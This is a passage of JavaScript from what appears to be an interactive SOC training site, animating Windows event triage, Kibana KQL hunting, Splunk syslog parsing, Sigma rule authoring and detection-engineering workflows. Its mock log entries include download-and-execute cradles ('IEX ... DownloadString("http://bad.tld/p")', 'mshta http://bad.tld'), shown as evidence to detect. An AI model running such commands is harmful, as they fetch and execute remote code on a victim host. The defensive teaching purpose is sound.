    { id: 4688, txt: 'ProcCreate Image=chrome.exe Parent=explorer.exe CmdLine=chrome https://corp', sev: 'ev-4688' },
    { id: 4698, txt: 'TaskCreate TaskName=\\Microsoft\\Windows\\Defrag\\ScheduledDefrag',          sev: 'ev-4698' },
    { id: 4624, txt: 'Logon  User=svc_backup    Src=10.0.0.42      LogonType=3  (Network/NTLM)',    sev: 'ev-susp' },
    { id: 4688, txt: 'ProcCreate Image=whoami.exe Parent=cmd.exe  CmdLine=whoami /priv',           sev: 'ev-4688' },
    { id: 4624, txt: 'Logon  User=administrator Src=WKS-07        LogonType=10 (Remote)',          sev: 'ev-4624' },
    { id: 4698, txt: 'TaskCreate TaskName=\\SystemHealthMonitor  Author=jdoe  CmdLine=powershell', sev: 'ev-susp' },
    { id: 4688, txt: 'ProcCreate Image=mshta.exe Parent=powershell.exe CmdLine=mshta http://bad.tld', sev: 'ev-susp' }
  ];

  const intro = `<strong>${escapeHtmlS(skill.name)}</strong> @ <strong style="color:var(--neon-2)">Intermediate</strong> — ${escapeHtmlS(meta.role)}.
    Scenario: ${escapeHtmlS(meta.scene)}. Windows Event Viewer-style triage of Security events — 4624 (Logon),
    4688 (Process Create), 4698 (Scheduled Task) — color-coded by event type. One Logon Type 3 from a
    non-domain host (10.0.0.42) is flagged suspicious. IOC this run: <span class="code-inline">${escapeHtmlS(meta.ioc)}</span>.`;

  const visual = `
    <div class="wevt-grid">
      <div class="wevt-sidebar siem-panel" style="padding:8px">
        <div class="siem-head"><span>// LOGS</span><span></span></div>
        <div class="wevt-cat-list" id="${slug}-cats">
          ${categories.map((c, i) => `
            <div class="wevt-cat-row" data-i="${i}">
              <span class="wevt-cat-name">${c.name}</span>
              <span class="wevt-cat-count" id="${slug}-cnt-${i}">0</span>
            </div>
          `).join('')}
        </div>
        <div class="wevt-sidebar-hint">Custom Views ▾</div>
        <div class="wevt-cat-row active">🔍 Suspicious Activity</div>
      </div>
      <div class="wevt-stream-wrap siem-panel" style="padding:8px">
        <div class="siem-head">
          <span>// SECURITY EVENT STREAM</span>
          <span id="${slug}-phase">// idle</span>
        </div>
        <div class="wevt-stream" id="${slug}-stream"></div>
      </div>
    </div>
  `;

  const lines = [
    `$ wevtutil — daily SOC Analyst workflow @ ${ts()}`,
    '$ # triage Security 4624 / 4688 / 4698 events on DC01',
    '$ wevtutil qe Security /q:"*[System[(EventID=4624 or EventID=4688 or EventID=4698)]]" /c:50 /rd:true /f:text',
    '[ok] retrieved 50 events from Security.evtx',
    '$ # color-code by EventID:',
    '[*] 4624 = Logon (blue)   4688 = Process Create (green)   4698 = Scheduled Task (amber)',
    '[*] inspecting LogonType 3 events (network logons):',
    '[!] 4624  User=svc_backup  Src=10.0.0.42  LogonType=3  Auth=NTLM  Workstation=—',
    '[!] 10.0.0.42 is NOT a domain host — workstation field empty',
    '[!] correlation: same src_ip triggered Splunk alert win_pth_hunt earlier',
    '$ # pivot to 4698 — look for new scheduled tasks by the same user:',
    '[!] 4698  TaskName=\\SystemHealthMonitor  Author=svc_backup  CmdLine=powershell -enc ...',
    '$ # pivot to 4688 — process tree of the suspicious user:',
    '[!] 4688  Image=mshta.exe  Parent=powershell.exe  CmdLine=mshta http://bad.tld',
    '$ # → escalate to IR: lateral movement + persistence + script-download chain',
    '$ wevtutil e Security /lw:true /of:/cases/dc01-security.evtx',
    '[ok] evidence exported — case INC-2025-047 created'
  ];

  function animate(host, timers) {
    const streamEl = host.querySelector('#' + slug + '-stream');
    const phaseEl  = host.querySelector('#' + slug + '-phase');
    const cntEls   = categories.map((_, i) => host.querySelector('#' + slug + '-cnt-' + i));
    const catRows  = host.querySelectorAll('#' + slug + '-cats .wevt-cat-row');

    // idempotent reset
    if (streamEl) streamEl.innerHTML = '';
    if (phaseEl) phaseEl.textContent = '// idle';
    cntEls.forEach(e => { if (e) e.textContent = '0'; });
    catRows.forEach(r => r.classList.remove('active'));

    let ei = 0;
    let secCount = 0;
    let appCount = 0;
    timers.every(() => {
      if (ei >= events.length) return;
      const e = events[ei++];
      if (!streamEl) return;

      const row = document.createElement('div');
      row.className = 'wevt-row ' + e.sev;
      row.innerHTML =
        '<span class="wevt-time">' + ts() + '</span>' +
        '<span class="wevt-id">' + e.id + '</span>' +
        '<span class="wevt-msg">' + e.txt + '</span>' +
        '<span class="wevt-led"></span>';
      streamEl.appendChild(row);
      while (streamEl.children.length > 7) streamEl.removeChild(streamEl.firstChild);

      // bump counts
      if (e.id === 4624 || e.id === 4688 || e.id === 4698) {
        secCount++;
        if (cntEls[1]) cntEls[1].textContent = secCount;
      }
      appCount++;
      if (cntEls[0]) cntEls[0].textContent = appCount;

      if (phaseEl) {
        if (e.sev === 'ev-susp') {
          phaseEl.textContent = '// suspicious — investigate';
          phaseEl.classList.add('err');
        } else {
          phaseEl.textContent = '// streaming Security log';
          phaseEl.classList.remove('err');
        }
      }
    }, 820);

    // light up the Security category at the start
    timers.later(() => {
      if (catRows[1]) catRows[1].classList.add('active');
    }, 200);
  }

  return { intro, visual, lines, animate };
}

/* ----- 6. Kibana — Beginner
 * Visual: Kibana Discover UI — KQL bar (typing real query), hit count + time
 *         picker, document list expanding below.
 * Animation: type KQL → hit count climbs → documents expand → one suspicious
 *            doc highlighted.
 */
function buildKibanaSim(skill, meta, lvl) {
  const slug = skill.name.toLowerCase().replace(/[^a-z0-9]+/g, '-');
  const kql = 'process.name: "powershell.exe" and process.command_line: *IEX*';
  const docs = [
    { t: '2025-01-14T09:23:47.182Z', hit: 'powershell.exe', host: 'WIN10-7',  cmdline: 'powershell -NoProfile -enc SQBFAFgA...',  susp: true },
    { t: '2025-01-14T09:22:12.014Z', hit: 'powershell.exe', host: 'WKS-12',   cmdline: 'powershell -ExecutionPolicy Bypass -File C:\\helper.ps1' },
    { t: '2025-01-14T09:19:03.881Z', hit: 'powershell.exe', host: 'WIN10-7',  cmdline: 'powershell IEX (New-Object Net.WebClient).DownloadString("http://bad.tld/p")', susp: true },
    { t: '2025-01-14T09:15:54.221Z', hit: 'powershell.exe', host: 'WKS-12',   cmdline: 'powershell -Command Get-Process | Format-Table' }
  ];

  const intro = `<strong>${escapeHtmlS(skill.name)}</strong> @ <strong style="color:var(--neon-2)">Beginner</strong> — ${escapeHtmlS(meta.role)}.
    Guided walkthrough: ${escapeHtmlS(meta.scene)}. Kibana Discover UI — KQL bar typing out a real query
    <span class="code-inline">process.name: "powershell.exe" and process.command_line: *IEX*</span>, hit count
    climbing, and documents expanding below. IOC this run: <span class="code-inline">${escapeHtmlS(meta.ioc)}</span>.`;

  const visual = `
    <div class="kibana-discover">
      <div class="kibana-toolbar">
        <span class="kibana-brand">🥢 Kibana</span>
        <div class="kibana-kql">
          <span class="kibana-kql-ico">KQL</span>
          <span class="kibana-kql-text" id="${slug}-kql"></span><span class="kibana-kql-caret" id="${slug}-caret">▍</span>
        </div>
        <button class="kibana-refresh">↻</button>
        <span class="kibana-time">⏱ 15 min ago ▾</span>
      </div>
      <div class="kibana-stats">
        <span class="kibana-hits" id="${slug}-hits">0</span>
        <span class="kibana-hits-lbl">hits</span>
        <span style="margin-left:14px" id="${slug}-shards">0/0 shards</span>
        <span style="margin-left:14px;color:var(--fg-dim)">discovered_fields: 12</span>
      </div>
      <div class="kibana-docs" id="${slug}-docs"></div>
    </div>
  `;

  const lines = [
    '$ # Kibana Discover — guided walkthrough @ ' + ts(),
    '$ # Goal: pivot from a Kibana dashboard to raw documents',
    '$ man kibana-kql',
    '[doc] KQL = Kibana Query Language (Lucene-based, supports AND/OR/NOT, wildcards)',
    '$ # Step 1: open Discover, type a KQL query:',
    `> ${kql}`,
    '[*] submitting to /winlog-2025.01/_search ...',
    '[ok] 4 hits in 1.2s · shards: 2/2 · discovered_fields: 12',
    '$ # Step 2: expand the first suspicious document:',
    '[ok] _id=Z4V5n4wB-... · process.name=powershell.exe · host.name=WIN10-7',
    '[!] process.command_line contains IEX + base64 payload (-enc SQBFAFgA...)',
    '$ # Step 3: pivot to surrounding documents (Surrounding docs)',
    '[ok] 2 docs within ±5 min — same _id pattern across WIN10-7',
    '$ # Step 4: add to timeline → create Security AI Detector rule',
    '[ok] detector rule mimikatz_signature_in_dns saved (id=det-4711)',
    '$ # → ready to progress to intermediate KQL + aggregations'
  ];

  function animate(host, timers) {
    const kqlEl  = host.querySelector('#' + slug + '-kql');
    const caret = host.querySelector('#' + slug + '-caret');
    const hits  = host.querySelector('#' + slug + '-hits');
    const shd   = host.querySelector('#' + slug + '-shards');
    const docsEl = host.querySelector('#' + slug + '-docs');

    // idempotent reset
    if (kqlEl) kqlEl.textContent = '';
    if (caret) caret.style.display = '';
    if (hits)  hits.textContent = '0';
    if (shd)   shd.textContent  = '0/0 shards';
    if (docsEl) docsEl.innerHTML = '';

    // Phase 1: type KQL
    let i = 0;
    timers.every(() => {
      if (i >= kql.length) return;
      i++;
      if (kqlEl) kqlEl.textContent = kql.slice(0, i);
    }, 28);
    const kqlMs = kql.length * 28 + 250;

    // Phase 2: query submitted — hit count climbs
    timers.later(() => {
      if (caret) caret.style.display = 'none';
      let n = 0;
      timers.every(() => {
        n++;
        if (hits) hits.textContent = Math.min(4, Math.floor(n * 0.4)).toString();
        if (shd)  shd.textContent  = Math.min(2, Math.floor(n * 0.22)) + '/2 shards';
      }, 90);

      // Phase 3: documents expand one-by-one
      timers.later(() => {
        let di = 0;
        timers.every(() => {
          if (di >= docs.length) return;
          const d = docs[di++];
          if (!docsEl) return;
          const doc = document.createElement('div');
          doc.className = 'kibana-doc' + (d.susp ? ' susp' : '');
          doc.innerHTML =
            '<div class="kibana-doc-head">' +
              '<span class="kibana-doc-toggle">▾</span>' +
              '<span class="kibana-doc-time">' + d.t + '</span>' +
              '<span class="kibana-doc-eq">' + d.hit + ' @ ' + d.host + '</span>' +
              (d.susp ? '<span class="kibana-doc-flag">⚠ suspicious</span>' : '') +
            '</div>' +
            '<div class="kibana-doc-body">' +
              '<div class="kibana-doc-field"><span class="kibana-doc-k">process.name</span><span class="kibana-doc-v">' + d.hit + '</span></div>' +
              '<div class="kibana-doc-field"><span class="kibana-doc-k">host.name</span><span class="kibana-doc-v">' + d.host + '</span></div>' +
              '<div class="kibana-doc-field"><span class="kibana-doc-k">process.command_line</span><span class="kibana-doc-v">' + d.cmdline + '</span></div>' +
              '<div class="kibana-doc-field"><span class="kibana-doc-k">_id</span><span class="kibana-doc-v">Z4V' + di + 'n4wB-...</span></div>' +
            '</div>';
          docsEl.appendChild(doc);
          while (docsEl.children.length > 4) docsEl.removeChild(docsEl.firstChild);
        }, 700);
      }, 1200);
    }, kqlMs);
  }

  return { intro, visual, lines, animate };
}

/* ----- 7. Log Parsing — Advanced
 * Visual: 3-column grid — raw syslog (left), transforms.conf / props.conf
 *         editor (middle), parsed structured fields (right).
 * Animation: raw syslog line in → regex match highlights → parsed fields
 *            populate → next line.
 */
function buildLogParsingSim(skill, meta, lvl) {
  const slug = skill.name.toLowerCase().replace(/[^a-z0-9]+/g, '-');
  const rawLines = [
    'Jan 14 09:23:47 dc01 sshd[1242]: Failed password for invalid user admin from 10.0.0.99 port 51432 ssh2',
    'Jan 14 09:24:01 dc01 sshd[1242]: Accepted publickey for jdoe from 10.0.0.42 port 42318 ssh2',
    'Jan 14 09:24:33 web03 nginx[881]: 10.0.0.99 - GET /api/v1/users 200 1843 ms',
    'Jan 14 09:25:09 dc01 sudo[1308]: jdoe : TTY=pts/0 ; PWD=/root ; COMMAND=/usr/bin/whoami'
  ];
  const regex = '^(?<timestamp>\\w+\\s+\\d+\\s+\\d+:\\d+:\\d+)\\s+(?<host>\\S+)\\s+(?<process>\\w+)(?:\\[(?<pid>\\d+)\\])?:\\s+(?<message>.*)$';
  const propsConf = [
    '[syslog]',
    'REGEX = ^(?<timestamp>\\w+\\s+\\d+\\s+\\d+:\\d+:\\d+)\\s+(?<host>\\S+)\\s+(?<process>\\w+)(?:\\[(?<pid>\\d+)\\])?:\\s+(?<message>.*)$',
    'FORMAT = timestamp::$1 host::$2 process::$3 pid::$4 message::$5',
    'SHOULD_LINEMERGE = false',
    'TZ = UTC',
    '',
    '[source::tcp:514]',
    'TRANSFORMS = syslog_parse'
  ];

  const intro = `<strong>${escapeHtmlS(skill.name)}</strong> @ <strong style="color:var(--neon-2)">Advanced</strong> — ${escapeHtmlS(meta.role)}.
    Multi-step investigation: ${escapeHtmlS(meta.scene)}. Real Splunk <span class="code-inline">transforms.conf</span>
    regex parses raw syslog lines into structured fields (timestamp, host, process, pid, message) for the
    downstream SIEM. Each raw line is matched and the parsed fields populate on the right.
    IOC this run: <span class="code-inline">${escapeHtmlS(meta.ioc)}</span>.`;

  const visual = `
    <div class="lp-grid">
      <div class="lp-raw siem-panel" style="padding:8px">
        <div class="siem-head"><span>// RAW SYSLOG (tcp:514)</span><span>tail -f</span></div>
        <div class="lp-raw-list" id="${slug}-raw"></div>
      </div>
      <div class="lp-config script-editor">
        <div class="sim-h">// transforms.conf / props.conf</div>
        <pre class="code-viewer" id="${slug}-regex" style="max-height:180px"></pre>
      </div>
      <div class="lp-parsed siem-panel" style="padding:8px">
        <div class="siem-head"><span>// PARSED FIELDS</span><span id="${slug}-match-count">0 matches</span></div>
        <div class="lp-parsed-list" id="${slug}-parsed"></div>
      </div>
    </div>
  `;

  const lines = [
    `$ splunk transforms.conf — advanced investigation @ ${ts()}`,
    `$ # ${lvlLine(lvl, 'open')} — ${lvlLine(lvl, 'close')}`,
    '$ # parse raw syslog (inotify on /var/log/auth.log) into structured fields',
    '$ vim /opt/splunk/etc/system/local/transforms.conf',
    '[syslog]',
    'REGEX = ^(?<timestamp>\\w+\\s+\\d+\\s+\\d+:\\d+:\\d+)\\s+(?<host>\\S+)\\s+(?<process>\\w+)(?:\\[(?<pid>\\d+)\\])?:\\s+(?<message>.*)$',
    'FORMAT = timestamp::$1 host::$2 process::$3 pid::$4 message::$5',
    '$ # inspect the regex against a raw line:',
    '$ echo "Jan 14 09:23:47 dc01 sshd[1242]: Failed password..." | splunk regex-test syslog',
    '[ok] groups: timestamp="Jan 14 09:23:47" host="dc01" process="sshd" pid="1242" message="Failed password..."',
    '$ # deploy & watch the parsed-fields panel populate',
    '$ splunk reload transforms && splunk tail source=tcp:514 | table timestamp host process pid message',
    '[ok] 4 events parsed · 0 unparseable · 100% CIM compliance',
    '[!] 1 suspicious parse: process=sshd pid=1242 message contains "Failed password for invalid user admin"',
    '$ # → branch detection rule win_sshd_failed_invalid_user with src_ip extraction from message',
    '$ # → produces a remediation proposal: rate-limit sshd (MaxAuthTries=3, Fail2Ban on 10.0.0.99/32)'
  ];

  function animate(host, timers) {
    const rawEl    = host.querySelector('#' + slug + '-raw');
    const regexEl  = host.querySelector('#' + slug + '-regex');
    const parsedEl = host.querySelector('#' + slug + '-parsed');
    const matchEl  = host.querySelector('#' + slug + '-match-count');

    // idempotent reset
    if (rawEl) rawEl.innerHTML = '';
    if (regexEl) regexEl.textContent = '';
    if (parsedEl) parsedEl.innerHTML = '';
    if (matchEl) matchEl.textContent = '0 matches';

    // Phase 1: type out the props.conf / transforms.conf stanzas
    let ci = 0;
    timers.every(() => {
      if (ci >= propsConf.length) return;
      const ln = propsConf[ci++];
      if (regexEl) {
        regexEl.textContent += ln + '\n';
        regexEl.scrollTop = regexEl.scrollHeight;
      }
    }, 180);
    const cfgMs = propsConf.length * 180 + 300;

    // Phase 2: stream raw syslog lines and parse each
    timers.later(() => {
      let li = 0;
      let matchCount = 0;
      timers.every(() => {
        if (li >= rawLines.length) return;
        const raw = rawLines[li++];
        // append raw line on the left
        if (rawEl) {
          const r = document.createElement('div');
          r.className = 'lp-raw-line';
          r.textContent = raw;
          rawEl.appendChild(r);
          while (rawEl.children.length > 5) rawEl.removeChild(rawEl.firstChild);
        }
        // 300ms later, parse it and populate the right panel
        timers.later(() => {
          const m = raw.match(/^(?<timestamp>\w+\s+\d+\s+\d+:\d+:\d+)\s+(?<host>\S+)\s+(?<process>\w+)(?:\[(?<pid>\d+)\])?:\s+(?<message>.*)$/);
          if (!m || !m.groups || !parsedEl) return;
          matchCount++;
          if (matchEl) matchEl.textContent = matchCount + ' matches';
          const card = document.createElement('div');
          card.className = 'lp-parsed-card';
          card.innerHTML =
            '<div class="lp-field"><span class="lp-field-k">timestamp</span><span class="lp-field-v">' + m.groups.timestamp + '</span></div>' +
            '<div class="lp-field"><span class="lp-field-k">host</span><span class="lp-field-v">' + m.groups.host + '</span></div>' +
            '<div class="lp-field"><span class="lp-field-k">process</span><span class="lp-field-v">' + m.groups.process + '</span></div>' +
            '<div class="lp-field"><span class="lp-field-k">pid</span><span class="lp-field-v">' + (m.groups.pid || '—') + '</span></div>' +
            '<div class="lp-field"><span class="lp-field-k">message</span><span class="lp-field-v">' + m.groups.message + '</span></div>';
          parsedEl.appendChild(card);
          while (parsedEl.children.length > 3) parsedEl.removeChild(parsedEl.firstChild);
        }, 350);
      }, 900);
    }, cfgMs);
  }

  return { intro, visual, lines, animate };
}

/* ----- 8. Sigma Rule Authoring — Intermediate
 * Visual: Sigma YAML editor (left) + ATT&CK coverage panel (right).
 *         Real Sigma rule for persistence via scheduled task being typed out
 *         field-by-field. ATT&CK T1053.005 coverage gap shows red until the
 *         rule is "saved", at which point the gap closes (green ✓).
 * Animation: type YAML fields → coverage gap visible → save rule → gap closes
 */
function buildSigmaRuleAuthoringSim(skill, meta, lvl) {
  const slug = skill.name.toLowerCase().replace(/[^a-z0-9]+/g, '-');
  const sigmaYaml = [
    'title: Windows Persistence via Scheduled Task Creation',
    'id: 9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d',
    'status: experimental',
    'description: Detects schtasks /create with persistence patterns',
    'author: Souhaieb Marzouk',
    'references:',
    '  - https://attack.mitre.org/techniques/T1053/005/',
    '  - https://lolbas-project.github.io/lolbas/Binaries/Schtasks/',
    'tags:',
    '  - attack.persistence',
    '  - attack.t1053.005',
    'logsource:',
    '  product: windows',
    '  service: security',
    'detection:',
    '  selection_cmdline:',
    '    EventID: 4688',
    '    CommandLine|contains:',
    '      - \'schtasks /create\'',
    '      - \'/tn \'',
    '  filter_legit:',
    '    CommandLine|contains:',
    '      - \'SCCM\'',
    '      - \'\\Microsoft\\Windows\\\'',
    '  condition: selection_cmdline and not filter_legit',
    'falsepositives:',
    '  - SCCM admin tasks',
    '  - Software deployment systems',
    'level: medium'
  ];
  const attckTechniques = [
    { id: 'T1053.005', name: 'Scheduled Task/Job: Scheduled Task', coverage: false },
    { id: 'T1059.001', name: 'Command & Scripting: PowerShell',  coverage: true },
    { id: 'T1071.004', name: 'App Layer Protocol: DNS',           coverage: true },
    { id: 'T1003.001', name: 'OS Cred Dumping: LSASS',            coverage: true }
  ];

  const intro = `<strong>${escapeHtmlS(skill.name)}</strong> @ <strong style="color:var(--neon-2)">Intermediate</strong> — ${escapeHtmlS(meta.role)}.
    Scenario: ${escapeHtmlS(meta.scene)}. A real Sigma rule for persistence via scheduled task is authored
    field-by-field. The ATT&CK T1053.005 coverage gap (visible as a red indicator) closes once the rule is
    saved and validated. IOC this run: <span class="code-inline">${escapeHtmlS(meta.ioc)}</span>.`;

  const visual = `
    <div class="script-grid">
      <div class="script-editor">
        <div class="sim-h">// sigma-rule.yml</div>
        <pre class="code-viewer" id="${slug}-yaml" style="max-height:280px"></pre>
        <button class="sigma-save-btn" id="${slug}-save">💾 Save rule</button>
      </div>
      <div class="script-exec siem-panel" style="padding:10px">
        <div class="siem-head"><span>// ATT&CK COVERAGE</span><span id="${slug}-cov-state">gap</span></div>
        <div class="sigma-attack-check" id="${slug}-attack">
          ${attckTechniques.map((t, i) => `
            <div class="sigma-attack-row ${t.coverage ? 'covered' : 'gap'}" data-i="${i}">
              <span class="sigma-attack-id">${t.id}</span>
              <span class="sigma-attack-name">${t.name}</span>
              <span class="sigma-attack-state" id="${slug}-ast-${i}">${t.coverage ? '✓ covered' : '✗ gap'}</span>
            </div>
          `).join('')}
        </div>
        <div class="sigma-validation" id="${slug}-validation">
          <div class="sim-h" style="margin-top:12px">// validation log</div>
          <div class="sigma-val-line" id="${slug}-val-line">// awaiting save...</div>
        </div>
      </div>
    </div>
  `;

  const lines = [
    `$ sigma-cli — daily Detection Engineer workflow @ ${ts()}`,
    '$ vim /rules/win_persistence_schtasks.yml',
    '$ # author the Sigma rule for persistence via scheduled task:',
    '$ sigma-cli check win_persistence_schtasks.yml',
    '[ok] schema: sigma-2.0.x — valid',
    '[ok] logsource: windows/security — supported by Splunk backend',
    '[warn] ATT&CK tag T1053.005 has NO coverage in current rule set → this rule closes it',
    '$ # convert Sigma → Splunk SPL via the splunk backend:',
    '$ sigma-cli convert -t splunk win_persistence_schtasks.yml',
    '[ok] (EventCode=4688 AND (CmdLine contains "schtasks /create" OR "/tn ") AND NOT (...SCCM...))',
    '$ # test against the curated EVTX corpus:',
    '$ sigma-cli test win_persistence_schtasks.yml --corpus evtx-corpus/',
    '[ok] 3 true-positives matched (suspicious schtasks /create /tn SystemHealth)',
    '[ok] 1 false-positive (SCCM admin task) — handled by filter_legit',
    '$ sigma-cli push win_persistence_schtasks.yml --backend splunk-prod',
    '[ok] rule saved → ATT&CK T1053.005 coverage gap CLOSED'
  ];

  function animate(host, timers) {
    const yamlEl = host.querySelector('#' + slug + '-yaml');
    const saveBtn = host.querySelector('#' + slug + '-save');
    const covState = host.querySelector('#' + slug + '-cov-state');
    const gapRow = host.querySelector('#' + slug + '-attack .sigma-attack-row.gap');
    const gapState = host.querySelector('#' + slug + '-ast-0');
    const valLine = host.querySelector('#' + slug + '-val-line');

    // idempotent reset
    if (yamlEl) yamlEl.textContent = '';
    if (saveBtn) { saveBtn.textContent = '💾 Save rule'; saveBtn.classList.remove('saved'); }
    if (covState) { covState.textContent = 'gap'; covState.classList.remove('ok'); }
    if (gapRow) gapRow.classList.remove('closing', 'closed');
    if (gapState) gapState.textContent = '✗ gap';
    if (valLine) valLine.textContent = '// awaiting save...';

    // Phase 1: type out the Sigma YAML line-by-line
    let yi = 0;
    timers.every(() => {
      if (yi >= sigmaYaml.length) return;
      const ln = sigmaYaml[yi++];
      if (yamlEl) {
        yamlEl.textContent += ln + '\n';
        yamlEl.scrollTop = yamlEl.scrollHeight;
      }
    }, 220);
    const yamlMs = sigmaYaml.length * 220 + 300;

    // Phase 2: validate on save — gap closes
    timers.later(() => {
      if (valLine) valLine.textContent = '✓ schema sigma-2.0.x valid · backend splunk · ATT&CK tag resolved';
      if (saveBtn) { saveBtn.textContent = '✓ Saved'; saveBtn.classList.add('saved'); }
      // mark the gap as closing
      timers.later(() => {
        if (gapRow) gapRow.classList.add('closing');
        if (gapState) gapState.textContent = 'closing...';
      }, 600);
      timers.later(() => {
        if (gapRow) { gapRow.classList.remove('closing'); gapRow.classList.add('closed'); }
        if (gapState) gapState.textContent = '✓ covered';
        if (covState) { covState.textContent = 'covered'; covState.classList.add('ok'); }
      }, 1400);
    }, yamlMs);
  }

  return { intro, visual, lines, animate };
}

/* ----- 9. Detection Engineering — Advanced
 * Visual: 5-stage lifecycle pipeline (Hypothesis → Draft Rule → Test in CI →
 *         Tune FP → Deploy) + rule card + CI log (failing first, then passing)
 *         + FP gauge (15.4% → 2.1%).
 * Animation: hypothesis → draft rule → CI test FAILS → fix applied → CI retest
 *            PASS → FP tuning reduces rate from 15.4% to 2.1% → deploy to prod
 */
function buildDetectionEngineeringSim(skill, meta, lvl) {
  const slug = skill.name.toLowerCase().replace(/[^a-z0-9]+/g, '-');
  const stages = [
    { no: '01', name: 'Hypothesis',   state: 'pending' },
    { no: '02', name: 'Draft Rule',   state: 'pending' },
    { no: '03', name: 'Test in CI',   state: 'pending' },
    { no: '04', name: 'Tune FP',      state: 'pending' },
    { no: '05', name: 'Deploy',       state: 'pending' }
  ];
  const ciLogFail = [
    '$ git commit -m "feat: add win_persistence_schtasks detection"',
    '$ git push origin detection/win_persistence_schtasks',
    '[ci:detect-test] running sigma-test on 10-event corpus...',
    '[ci:detect-test] expected_match: 3 · actual_match: 0',
    '[ci:detect-test] FAIL — 3 expected matches not found',
    '[ci:detect-test] review selection_cmdline matching logic'
  ];
  const ciLogPass = [
    '$ git commit -m "fix: relax /tn match (whitespace tolerant)"',
    '[ci:detect-test] running sigma-test on 10-event corpus...',
    '[ci:detect-test] expected_match: 3 · actual_match: 3 · FP: 4 (15.4%)',
    '[ci:detect-test] PASS — FP rate 15.4% > 5% threshold → tune phase'
  ];
  const tuneLog = [
    '[detect-tune] reviewing 4 FP events from corpus...',
    '[detect-tune] root cause: SCCM admin task /tn SystemHealth',
    '[detect-tune] adding filter_legit: CommandLine contains "SCCM"',
    '[detect-tune] re-tested FP = 2.1% (within 5% threshold) ✓',
    '[detect-deploy] pushed to prod splunk — content update scheduled'
  ];

  const intro = `<strong>${escapeHtmlS(skill.name)}</strong> @ <strong style="color:var(--neon-2)">Advanced</strong> — ${escapeHtmlS(meta.role)}.
    End-to-end lifecycle: ${escapeHtmlS(meta.scene)}. A detection rule <span class="code-inline">win_persistence_schtasks</span>
    moves through 5 stages — hypothesis, draft, CI test (fails first!), FP tuning (15.4% → 2.1%), and deploy.
    IOC this run: <span class="code-inline">${escapeHtmlS(meta.ioc)}</span>.`;

  const visual = `
    <div class="pipeline-flow" id="${slug}-flow">
      ${stages.map((s, i) => `
        <div class="pl-step pending" data-i="${i}">
          <span class="pl-no">${s.no}</span>
          <span class="pl-name">${s.name}</span>
          <span class="pl-state" id="${slug}-st-${i}">QUEUED</span>
        </div>${i < stages.length - 1 ? '<div class="pl-arrow">→</div>' : ''}
      `).join('')}
    </div>
    <div class="de-grid">
      <div class="de-rule-card siem-panel" style="padding:10px">
        <div class="siem-head"><span>// RULE</span><span id="${slug}-rule-state">draft</span></div>
        <div class="de-rule-name">win_persistence_schtasks</div>
        <div class="de-rule-meta">
          <div><b>logsource:</b> windows/security</div>
          <div><b>EventID:</b> 4688</div>
          <div><b>author:</b> Souhaieb Marzouk</div>
          <div><b>ATT&amp;CK:</b> T1053.005</div>
        </div>
        <div class="de-fp-gauge">
          <div class="de-fp-lbl">FP rate</div>
          <div class="de-fp-bar"><span class="de-fp-fill" id="${slug}-fp-fill" style="width:0%"></span></div>
          <div class="de-fp-num"><span id="${slug}-fp-val">0.0%</span> <span class="de-fp-thresh">(threshold 5.0%)</span></div>
        </div>
      </div>
      <div class="de-ci-log script-editor">
        <div class="sim-h">// CI + tuning log</div>
        <pre class="code-viewer" id="${slug}-log" style="max-height:220px"></pre>
      </div>
    </div>
  `;

  const lines = [
    `$ # Detection Engineering — advanced lifecycle @ ${ts()}`,
    `$ # ${lvlLine(lvl, 'open')} — ${lvlLine(lvl, 'close')}`,
    '$ # hypothesis: persistent actors use schtasks /create /tn for privilege persistence',
    '$ git checkout -b detection/win_persistence_schtasks',
    '$ vim rules/win_persistence_schtasks.yml',
    '$ git commit -m "feat: add win_persistence_schtasks detection"',
    '$ git push origin detection/win_persistence_schtasks',
    '[ci:detect-test] FAIL — 3 expected matches not found (regex too strict on /tn whitespace)',
    '$ # fix the regex, re-run CI',
    '[ci:detect-test] PASS — 3/3 true-positives · FP=15.4% (> 5% threshold → tune phase)',
    '$ # review FP corpus: 4 events all from SCCM admin task /tn SystemHealth',
    '$ # add filter_legit: CommandLine contains "SCCM"',
    '[detect-tune] re-tested FP=2.1% (within 5% threshold) ✓',
    '[detect-deploy] pushed to prod splunk (rule win_persistence_schtasks)',
    '[ok] lifecycle complete — rule deployed in 3h (industry avg 5.2h)',
    '$ # → remediation proposal: add to daily SOC report + auto-create TheHive case on hit'
  ];

  function animate(host, timers) {
    const steps = host.querySelectorAll('#' + slug + '-flow .pl-step');
    const stepStates = stages.map((_, i) => host.querySelector('#' + slug + '-st-' + i));
    const logEl = host.querySelector('#' + slug + '-log');
    const ruleState = host.querySelector('#' + slug + '-rule-state');
    const fpFill = host.querySelector('#' + slug + '-fp-fill');
    const fpVal  = host.querySelector('#' + slug + '-fp-val');

    // idempotent reset
    steps.forEach(s => s.classList.remove('running', 'done', 'warn', 'pending'));
    steps.forEach(s => s.classList.add('pending'));
    stepStates.forEach(s => { if (s) s.textContent = 'QUEUED'; });
    if (logEl) logEl.textContent = '';
    if (ruleState) ruleState.textContent = 'draft';
    if (fpFill) fpFill.style.width = '0%';
    if (fpVal)  fpVal.textContent  = '0.0%';

    function setStep(i, cls, state) {
      if (steps[i]) { steps[i].classList.remove('pending'); steps[i].classList.add(cls); }
      if (stepStates[i]) stepStates[i].textContent = state;
    }

    // Phase 1: hypothesis (passes)
    timers.later(() => { setStep(0, 'running', 'RUNNING'); if (logEl) logEl.textContent = ''; }, 400);
    timers.later(() => { setStep(0, 'done', 'PASS'); }, 1300);

    // Phase 2: draft rule
    timers.later(() => { setStep(1, 'running', 'RUNNING'); }, 1500);
    timers.later(() => { setStep(1, 'done', 'PASS'); if (ruleState) ruleState.textContent = 'drafted'; }, 2500);

    // Phase 3: CI test FAILS first, then passes after fix
    timers.later(() => {
      setStep(2, 'running', 'RUNNING');
      let li = 0;
      timers.every(() => {
        if (li >= ciLogFail.length) return;
        const ln = ciLogFail[li++];
        if (logEl) { logEl.textContent += ln + '\n'; logEl.scrollTop = logEl.scrollHeight; }
      }, 280);
      timers.later(() => {
        setStep(2, 'warn', 'FAIL');
        // fix applied — re-run CI
        let li2 = 0;
        timers.later(() => {
          setStep(2, 'running', 'RE-TEST');
          timers.every(() => {
            if (li2 >= ciLogPass.length) return;
            const ln = ciLogPass[li2++];
            if (logEl) { logEl.textContent += ln + '\n'; logEl.scrollTop = logEl.scrollHeight; }
          }, 320);
        }, 800);
        timers.later(() => {
          setStep(2, 'done', 'PASS');
          // FP gauge jumps to 15.4%
